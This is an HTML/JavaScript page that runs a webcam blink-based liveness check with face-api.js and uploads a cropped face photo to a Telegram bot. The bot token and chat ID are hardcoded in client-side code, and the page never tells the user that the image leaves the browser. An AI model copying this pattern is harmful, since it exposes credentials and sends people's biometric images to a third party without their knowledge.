<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="tg:theme" content="light">
    <meta name="tg:swipes:x" content="none">
    <meta name="tg:swipes:y" content="none">
    <meta name="tg:theme-accent" content="#FFFFFF">
    <meta name="theme-color" content="#000000">
    <meta name="tg:theme-background" content="#000000"> -->
    <meta property="og:site_name" content="Face Detection and Liveness check">
    <meta property="og:title" content="Liveness Detection">

    <title>Liveness Detection</title>

    <style>
        body,
        html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        /* Container for video and overlay */
        #container {
            position: relative;
            width: 640px;
            height: 470px;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Oval overlay for face alignment */
        #overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 4px solid red;
            /* Default Red (Error) */
            width: 250px;
            height: 350px;
            border-radius: 50%;
            pointer-events: none;
        }

        #status {
            margin-top: 10px;
            color: white;
            font-size: 20px;
        }

        /* Blur effect outside oval */
        #blurOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            /* clip-path: path('M0,0H640V480H0Z M235,110 A125,175,0,1,0,319.9,65Z'); */
            clip-path: path('M0,0H640V480H0Z M319,65 A125,175,0,1,0,319.9,65Z');
            pointer-events: none;
        }
    </style>
</head>

<body>
    <canvas id="captureCanvas" style="display: none;"></canvas>
    <div id="container">
        <video id="video" autoplay playsinline></video>
        <div id="blurOverlay"></div>
        <div id="overlay"></div>
    </div>
    <div id="status">Loading models...</div>

    <!-- Load face-api.js from CDN -->
    <script src="js/face-api.js"></script>
    <!-- <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Expands the WebView to fullscreen
        tg.ready(); // Notifies Telegram that the WebApp is ready
        tg.sendData(JSON.stringify({ key: "value" }));
    </script> -->


    <script>
        const video = document.getElementById("video");
        const statusText = document.getElementById("status");
        const overlay = document.getElementById("overlay");

        let gotPhoto = false;
        let blinkCounter = 0;
        let blinkState = false;
        let faceInsideOval = false;
        const blinkThreshold = 0.25;

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 15 } // Lower frame rate
                    }
                });
                video.srcObject = stream;
            } catch (error) {
                statusText.textContent = "Webcam access denied!";
                console.error(error);
            }
        }

        async function loadModels() {
            await faceapi.nets.tinyFaceDetector.loadFromUri('models');
            await faceapi.nets.faceLandmark68Net.loadFromUri('models');
            statusText.textContent = "Models loaded. Detecting face...";
            await detectFace();
        }

        function isPointInOval(point, oval) {
            let cx = oval.left + oval.width / 2;
            let cy = oval.top + oval.height / 2;
            let rx = oval.width / 2;
            let ry = oval.height / 2;
            let dx = point.x - cx;
            let dy = point.y - cy;
            // Adjust face center based on this threshold ex: 0.1            
            return (dx * dx) / (rx * rx) + (dy * dy) / (ry * ry) <= 0.1;
        }

        async function detectFace() {
            const videoRect = video.getBoundingClientRect();
            const ovalRect = overlay.getBoundingClientRect();

            setInterval(async () => {
                const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({
                    inputSize: 320, // Adjust input size to reduce computation
                    scoreThreshold: 0.5 // Keep this threshold low for accurate detection
                })).withFaceLandmarks();

                if (detections) {
                    let faceBox = detections.detection.box;
                    let faceCenter = { x: faceBox.x + faceBox.width / 2, y: faceBox.y + faceBox.height / 2 };

                    let scaleX = videoRect.width / video.videoWidth;
                    let scaleY = videoRect.height / video.videoHeight;

                    let faceCenterViewport = {
                        x: videoRect.left + faceCenter.x * scaleX,
                        y: videoRect.top + faceCenter.y * scaleY
                    };

                    faceInsideOval = isPointInOval(faceCenterViewport, ovalRect);

                    if (faceInsideOval) {
                        const isBlinking = detectBlink(detections);
                        console.log("isBlinking: ", isBlinking);

                        if (isBlinking) {
                            // Increment the blink counter on each detected blink
                            blinkCounter++;

                            if (blinkCounter > 1) { // Skip the first blink
                                blinkState = true;
                                overlay.style.borderColor = "green";
                                statusText.textContent = "Liveness confirmed!";
                            }
                        } else {
                            if (blinkState) {
                                overlay.style.borderColor = "green";
                                statusText.textContent = "Liveness confirmed!";
                                if (!gotPhoto) {
                                    gotPhoto = true;
                                    setTimeout(() => {
                                        const dataURL = takeScreenshot("blinking", detections.detection.box);
                                        sendToTelegramBot(dataURL);
                                    }, 100);
                                }
                            } else {
                                overlay.style.borderColor = "green"; // Green if inside oval
                                statusText.textContent = "Face detected inside oval. Blink to confirm!";
                            }
                        }
                    } else {
                        blinkState = false;
                        overlay.style.borderColor = "red"; // Red if outside
                        statusText.textContent = "Align face inside the oval!";
                    }

                } else {
                    overlay.style.borderColor = "red";
                    statusText.textContent = "No face detected!";
                }
            }, 100);
        }

        function detectBlink(detections) {
            const landmarks = detections.landmarks;
            const leftEye = landmarks.getLeftEye();
            const rightEye = landmarks.getRightEye();

            function eyeAspectRatio(eye) {
                const a = distance(eye[1], eye[5]);
                const b = distance(eye[2], eye[4]);
                const c = distance(eye[0], eye[3]);
                return (a + b) / (2.0 * c);
            }

            function distance(point1, point2) {
                return Math.sqrt(Math.pow(point1._x - point2._x, 2) + Math.pow(point1._y - point2._y, 2));
            }

            const leftEAR = eyeAspectRatio(leftEye);
            const rightEAR = eyeAspectRatio(rightEye);
            const EAR = (leftEAR + rightEAR) / 2.0;

            return EAR < blinkThreshold; // Threshold for blink detection
        }

        function takeScreenshot(state, faceBox) {
            const canvas = document.getElementById("captureCanvas");
            const context = canvas.getContext("2d");

            // Define padding for extra space around the face
            const widthPadding = 30; // Adjust this value for more/less padding
            const heightPadding = 60; // Adjust this value for more/less padding
            const videoWidth = video.videoWidth;
            const videoHeight = video.videoHeight;

            // Calculate new dimensions with padding
            const x = Math.max(0, faceBox.x - widthPadding); // Ensure it doesn't go out of bounds
            const y = Math.max(0, faceBox.y - heightPadding);
            const width = Math.min(faceBox.width + 2 * widthPadding, videoWidth - x); // Keep within video bounds
            const height = Math.min(faceBox.height + 2 * heightPadding, videoHeight - y);

            // Set canvas size to match the padded face area
            canvas.width = width;
            canvas.height = height;

            // Draw the padded face area onto the canvas
            context.drawImage(
                video,
                x, // Source X (top-left corner with padding)
                y, // Source Y (top-left corner with padding)
                width, // Source width (face width with padding)
                height, // Source height (face height with padding)
                0, // Destination X (start at top-left of the canvas)
                0, // Destination Y (start at top-left of the canvas)
                canvas.width, // Destination width
                canvas.height // Destination height
            );

            // Convert canvas content to a data URL (Base64 image)
            const dataURL = canvas.toDataURL("image/png");

            // Save the image or display it (example: console log the URL)
            console.log(`Screenshot (${state})`);

            return dataURL;
        }

        function sendToTelegramBot(dataURL) {
            const botToken = "7907821344:AAEJYy-7K_8aDZlxeYGdDXPTHqBsOQNj40k";
            const chatId = "720530019";
            // Convert base64 to Blob
            function dataURLtoBlob(dataURL) {
                const byteString = atob(dataURL.split(",")[1]);
                const mimeString = dataURL.split(",")[0].split(":")[1].split(";")[0];
                const arrayBuffer = new ArrayBuffer(byteString.length);
                const uint8Array = new Uint8Array(arrayBuffer);
                for (let i = 0; i < byteString.length; i++) {
                    uint8Array[i] = byteString.charCodeAt(i);
                }
                return new Blob([arrayBuffer], { type: mimeString });
            }

            // Convert to Blob
            const imageBlob = dataURLtoBlob(dataURL);
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", imageBlob, "screenshot.png");

            // Send image to Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            })
                .then(response => response.json())
                .then(data => console.log("Telegram Response:", data))
                .catch(error => console.error("Error sending image:", error));
        }

        // Initialize Webcam and Load Models
        setupCamera().then(loadModels);
    </script>
</body>

</html>